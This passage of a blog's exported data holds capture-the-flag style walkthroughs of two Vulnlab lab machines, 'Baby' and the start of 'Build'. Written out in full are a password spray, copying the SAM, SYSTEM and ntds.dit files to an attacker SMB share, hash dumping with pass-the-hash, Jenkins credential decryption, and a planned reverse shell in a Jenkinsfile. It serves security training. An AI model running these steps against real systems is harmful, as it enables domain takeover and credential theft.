machine.</p>\n<p>Underneath <code>[*] Reading and decrypting hashes from ntds.dit</code>, we’ll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using <code>crackmapexec</code> once more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/c.png\" alt=\"image2\" title=\"C\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\">https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&amp;text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine is a more beginner-level Active Directory machine, however it’s very useful if you want to understand fundamentals of AD and how to exploit it. You’ll see a lot of techniques here in more difficult machines (though they may be used differently).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that, let’s run our base NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.99.70</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we’ll check out the former ports. Let’s run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.99.70 -A</span><br><span class=\"line\"></span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br></pre></td></tr></table></figure>\n\n<p>Let’s add these to our <code>/etc/hosts</code> file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.99.70 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>SMB does not seem to be helpful as of right now, so let’s try to focus on LDAP. Normally, it’s an extremely insecure practice to allow null LDAP enumeration. That being said, there’s no harm in trying to run a few queries with LDAP to test for any responses.</p>\n<h1 id=\"LDAP-Enumeration\"><a href=\"#LDAP-Enumeration\" class=\"headerlink\" title=\"LDAP Enumeration\"></a>LDAP Enumeration</h1><p>Let’s first test for null authentication and query LDAP for all domain objects in the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=baby,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># baby.vl</span><br><span class=\"line\">dn: DC=baby,DC=vl</span><br><span class=\"line\"></span><br><span class=\"line\"># Administrator, Users, baby.vl</span><br><span class=\"line\">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we’d like. If we were on a Windows workstation that was within the domain, we could use tools like <code>ADSearch</code> or <code>PowerView</code> to query for any users, groups, essentially any domain object we’d like.</p>\n<p>Let’s adjust our LDAP search query so we can create a user list.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot; | grep &#x27;@baby.vl&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt; cat ul.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Jacqueline.Barnett</span><br><span class=\"line\">Ashley.Webb</span><br><span class=\"line\">Hugh.George</span><br><span class=\"line\">Leonard.Dyer</span><br><span class=\"line\">Connor.Wilkinson</span><br><span class=\"line\">Joseph.Hughes</span><br><span class=\"line\">Kerry.Wilson</span><br><span class=\"line\">Teresa.Bell</span><br></pre></td></tr></table></figure>\n\n<p>I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you’ll see that we missed a few users. I wasn’t certain if this was an LDAP issue or a <code>grep</code> issue, but nonetheless I copied the remaining users into the wordlist. (<code>Caroline.Robinson</code> and <code>Ian.Walker</code>)</p>\n<p>You’ll notice at the end of the same full LDAP dump output under <code>Teresa.Bell</code>, there seems to be a description comment that says <code>description: Set initial password to [...snip...</code>.</p>\n<p>We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use <code>crackmapexec</code> to test if any users have this password still set to their account. We’ll use SMB as our service to test against since we really don’t need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p &#x27;BabyStart123!&#x27;; done</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll get a hit on <code>Caroline.Robinson</code>, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and&#x2F;or interns.</p>\n<h1 id=\"Password-Reset-with-SMBPasswd\"><a href=\"#Password-Reset-with-SMBPasswd\" class=\"headerlink\" title=\"Password Reset with SMBPasswd\"></a>Password Reset with SMBPasswd</h1><p>In that case let’s try to reset their password with <code>smbpasswd</code>. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbpasswd -r BabyDC.baby.vl -U BABYDC/&#x27;Caroline.Robinson&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Old SMB password: ([...snip...])</span><br><span class=\"line\">New SMB password: password123@</span><br><span class=\"line\">Retype new SMB password: password123@</span><br><span class=\"line\">Password changed for user Caroline.Robinson</span><br></pre></td></tr></table></figure>\n\n<p>If we test the same <code>crackmapexec</code> command as above for <code>Caroline.Robinson</code>, we can see that their password was successfully updated. Normally I’d now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test <code>crackmapexec</code> against WinRM we can see that we already are able to login as this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Caroline.Robinson&#x27; -p &#x27;password123@&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, you can find the user flag within the user’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/b.png\" alt=\"image1\" title=\"B\"></p>\n<h1 id=\"Privilege-Escalation-w-SeBackupPrivilege\"><a href=\"#Privilege-Escalation-w-SeBackupPrivilege\" class=\"headerlink\" title=\"Privilege Escalation w&#x2F; SeBackupPrivilege\"></a>Privilege Escalation w&#x2F; SeBackupPrivilege</h1><p>Let’s do a quick privilege to see if there’s anything that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class=\"line\">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class=\"line\">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see from the output that we have <code>SeBackupPrivilege</code> enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the <code>SAM</code> and <code>SYSTEM</code> databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.</p>\n<p>So first, let’s dump both of these databases into a temporary directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; mkdir C:\\temp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\sam c:\\temp\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\system c:\\temp\\system</span><br></pre></td></tr></table></figure>\n\n<p>These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won’t be able to set up a simple C2 server’s without obfuscating our payloads, meaning we’ll need to find a way to transfer our files back and forth in a inconspicuous manner.</p>\n<p>We can use Impacket’s <code>smbserver</code> to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>-> Kali</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mkdir share/</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy sam \\\\(Kali IP)\\smb\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy system \\\\(Kali IP)\\smb\\system</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice a lot of output from our SMB server when we’re copying the files over, this is just a built-in Impacket functionality that will dump the user’s NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the <code>share/</code> directory we’ll see the two files that we downloaded are in this folder.</p>\n<p>Now that we have both of these files, let’s run <code>samdump</code> on them to retrieve credentials that are within these two databases.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ samdump2 system sam</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s hash, let’s test the creds once more with <code>crackmapexec</code> and by passing the hash to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we’ll need to look a little further with our <code>SeBackupPrivilege</code> to dump another file.</p>\n<h1 id=\"Diskshadow-Robocopy-for-NTDS-dit\"><a href=\"#Diskshadow-Robocopy-for-NTDS-dit\" class=\"headerlink\" title=\"Diskshadow&#x2F;Robocopy for NTDS.dit\"></a>Diskshadow&#x2F;Robocopy for NTDS.dit</h1><p>The file in particular that we’re looking for is a copy of the <code>C:\\</code>‘s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained <code>SAM</code> and <code>SYSTEM</code> databases to dump the AD secrets of the domain controller.</p>\n<p>To exploit this, we can use <code>diskshadow</code> and <code>robocopy</code> to create a copy of the current drive and copy the copied filesystem back to the <code>C:\\</code> drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article <a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">here</a>.)</p>\n<p>Let’s first create a file named <code>script.txt</code> and transfer it to our <code>Evil-WinRM</code> session. The contents of the script can be seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set metadata C:\\Windows\\Temp\\meta.cabX</span><br><span class=\"line\">set context clientaccessibleX</span><br><span class=\"line\">set context persistentX</span><br><span class=\"line\">begin backupX</span><br><span class=\"line\">add volume C: alias cdriveX</span><br><span class=\"line\">createX</span><br><span class=\"line\">expose %cdrive% E:X</span><br><span class=\"line\">end backupX</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><code>set metadata C:\\Windows\\Temp\\meta.cabX</code>: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, <code>C:\\Windows\\Temp\\meta.cabX</code>.</p>\n</li>\n<li><p><code>set context clientaccessibleX</code>: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>set context persistentX</code>: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>begin backupX</code>: This command is initiating the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>add volume C: alias cdriveX</code>: This command is adding the volume <code>C:</code> to the backup operation with an alias <code>cdriveX</code>. This means that the contents of the <code>C:</code> drive will be included in the backup. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>createX</code>: This command is creating something related to the backup operation. It’s not entirely clear what it’s creating without more context or additional information about the script.</p>\n</li>\n<li><p><code>expose %cdrive% E:X</code>: This command seems to be exposing the contents of the <code>C:</code> drive, which was added to the backup operation with the alias <code>cdriveX</code>, to a location specified by <code>%cdrive%</code> on drive <code>E:</code>. This might involve mounting the backup or making it accessible in some way. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>end backupX</code>: This command is ending the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n</ol>\n<p>Let’s set up a simple Python server so we can curl this script to our WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 -m http.server 9001</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://(Kali IP):9001/script.txt -O script.txt</span><br></pre></td></tr></table></figure>\n\n<p>Next, let’s run <code>diskshadow</code> to create a copy of the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diskshadow /s script.txt</span><br></pre></td></tr></table></figure>\n\n<p>After the filesystem copy finishes, it will be saved to <code>E:\\Windows</code>. This is where we can use <code>robocopy</code> to move it back to our <code>C:\\</code> drive.</p>\n<p><code>robocopy /b E:\\Windows\\ntds . ntds.dit</code></p>\n<p>Let’s now use our SMB server on our Kali machine to download the <code>ntds.dit</code> file from the WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit</span><br></pre></td></tr></table></figure>\n\n<p>From here, all that’s left to do is retrieve the correct NTLM hashes by dumping the DC secrets with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you’ll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.</p>\n<p>Underneath <code>[*] Reading and decrypting hashes from ntds.dit</code>, we’ll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using <code>crackmapexec</code> once more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/c.png\" alt=\"image2\" title=\"C\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\">https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&amp;text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></p>\n"},{"title":"Build - Vulnlab","date":"2024-06-05T05:28:47.000Z","keywords":"Vulnlab, Easy, Windows","description":"The is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.","cover":"/images/vulnlab/build-vl/build_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\n\nThe is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.\n\n# Enumeration\n\nLet's start with our usual NMAP scans of the machine. Note that I ran a port range scan from `1-10000`.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 23:42 EDT\nNmap scan report for 10.10.90.130\nHost is up (0.12s latency).\nNot shown: 9991 closed tcp ports (reset)\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n53/tcp   open     domain\n512/tcp  open     exec\n513/tcp  open     login\n514/tcp  open     shell\n873/tcp  open     rsync\n3000/tcp open     ppp\n3306/tcp filtered mysql\n8081/tcp filtered blackice-icecap\n\nNmap done: 1 IP address (1 host up) scanned in 126.41 seconds\n```\n\nSo as you can see, we have access to decent amount of ports on the target machine. The only issue is that ports `3306` and `8081` are filtered, meaning they are current behind a firewall. The only way for us to access these resources is to be on the machine internally.\n\nAs for the other ports, it seems that we have SSH access along with this machine being a DC having port 53. There also seems to be another port on this machine as `RSYNC`, which we have tested before my writeup for [Sync](https://dan-feliciano.com/writeups/sync/).\n\nFurthermore, we have access to a web application on port `3000`, which I've referenced before as having the potential to be vulnerable based on the catalog of web applications that use this port. You can find information about what this port can potentially host [here](https://www.speedguide.net/port.php?port=3000).\n\nThere are other ports on here that seem to have apparent vulnerabilities, being `512-514`, however we can ignore these for now as we'll need credentials to access them.\n\n# Gitea and Jenkins\n\nLet's access the web application on port `3000` to see if there's anything we can exploit.\n\n![](/images/vulnlab/build-vl/b.png)\n\nThis seems to bring us to a [Gitea](https://github.com/go-gitea/gitea) page, which is essentially a ported web application synced with Git for easy access to web development.\n\nIt seems that we're able to register for an account in the top left, so I'll fill in the necessary authorization requirements and see if we can access the application's login panel.\n\nAfter logging in, you can see that the web application has four tabs in the top left. These each access different resources, however the `Explore` one seems to bring promise as it let's us explore repositories that were imported to Gitea from other users.\n\n![](/images/vulnlab/build-vl/c.png)\n\nThis repository contains one file titled as a `Jenkinsfile`. I looked into this type of file a bit more, it seems to be linked to the [Jenkins](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) application. This specific application is used for deployment automation in web applications. The `Jenkinsfile` in particular is a text file that contains the deployment information of a Jenkins Pipeline, used to build different parts of the deployment.\n\nSince these builds are automated through Jenkins, this file in particular is probably being executed in intervals. The interesting part is that we have access to the source code for this build, meaning if we alter it, it should execute automatically.\n\nAt this point the attack path becomes clear, we'll need to compromise the `buildadm` account who has control over this repository and use it to place a reverse shell within the `Jenkinsfile`. From there, Jenkins should automatically execute this build along with our reverse shell.\n\n# RSYNC File Enumeration\n\nSince there isn't much else to check out on this webpage, let's turn our attention to RSYNC. To those who aren't aware, RSYNC s essentially a filesystem mounting/share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to `NFS`. This is used if users need to have files copied to another location in a quick-manner. In our case, `rsync` is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.\n\nWe can list all of the currently archived files within RSYNC with one simple command as seen below.\n\n```\n└─$ rsync -av --list-only rsync://10.10.90.130\nbackups         backups\n```\n\nIt seems that there's a `backups` archive within the contents of RSYNC filesystem, which we can download with the same `rsync` utility.\n\n```\n└─$ rsync -r 10.10.90.130::backups . \nrsync: [receiver] write error: Broken pipe (32)\nrsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1700) [sender=3.2.7]\n\n└─$ ls\njenkins.tar.gz\n```\n\nThe initial `rsync` download will take a long time as the archive is a big file. I've heard notice from some other people who were pen-testing this box that said the download itself took them almost 20 minutes to download. The key here is patience, it was finished in about 2-3 minutes for me.\n\nIt should return a `jenkins.tar.gz`, which is a double compressed archive. We can decompress it with `tar -xvf jenkins.tar.gz`. Be prepared for a lot of output the screen.\n\nThis returns the entire archive for the Jenkins application, which we'll parse to see if any important information is within the filesystem here.\n\nSo you'll notice that there are a few interesting files in different parts of this filesystem. You'll find a `secret.key` file in the root directory along with a `hudson.util.Secret` and `master.key` files within the `secrets` directory.\n\nWithin `jenkins_configuration/users/admin_8569439066427679502`, you can find a `config.xml` file that seems to be related to the admin user. You'll find a hash in this file for that same user.\n\n```\n</jenkins.model.experimentalflags.UserExperimentalFlagsProperty>\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\n      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\n    <hudson.tasks.Mailer_-UserProperty plugin=\"mailer@472.vf7c289a_4b_420\">\n      <emailAddress>admin@build.vl</emailAddress>\n```\n\nAlthough we aren't relatively 100% confident, I do believe that these files must be linked somehow. I'll do some research into these files to see if there's any plaintext passwords we can retrieve from them.\n\n# Decrypting Jenkins Passwords\n\nI found a notable utility on GitHub that decrypts these types of passwords. You can find that [here](https://github.com/hoto/jenkins-credentials-decryptor), and it involves using three types of files - the `master.key` file, the `hudson.util.Secret` file, and a `credentials.xml` file.\n\nThe only odd part is that the `config.xml` file we have for the admin user does not seem to work with those two secret files we have. Which makes sense - this isn't relative to the `buildadm` user that we are trying to access.\n\nI did a bit more poking around the archive and found a file that DOES seem to pertain to the `buildadm` user, underneath `/jenkins_configuration/jobs/build`.\n\n```\n<id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>\n<description></description>\n<username>buildadm</username>\n<password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>\n<usernameSecret>false</usernameSecret>\n```\n\nSince we have all the required files needed to decrypt this hash, let's move them all to our base directory for easier access.\n\n```\n└─$ jenkins-credentials-decryptor/bin/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml -o json\n[\n  {\n    \"id\": \"e4048737-7acd-46fd-86ef-a3db45683d4f\",\n    \"password\": \"[...snip...]\",\n    \"username\": \"buildadm\"\n  }\n]\n```\n\nIt seems that this specific file decryption script was able to decrypt the password successfully. The password was returned in a JSON format as seen above, which we can now use to access the `buildadm` user on Gitea.\n\n# Build -> RCE\n\nNow that we have access to this user on Gitea, we can take a look at the `Jenkinsfile` script within their repository.\n\n![](/images/vulnlab/build-vl/d.png)\n\nYou can see the respective repository on the right side of the page, or we can access it as we did before in the `Explore` tab. \n\nWithin the `Jenkinsfile`, we can select the `Edit` icon to the right of the file to alter it.\n\n![](/images/vulnlab/build-vl/e.png)\n\nThe file itself contains a small script that seems to be running `sh '/bin/true'`. You can do some research onto `Jenkinsfiles` to see if there are any reverse shells that we can upload. I found however that you can enclose multiple line scripts within a directory block, to where I got the impression from 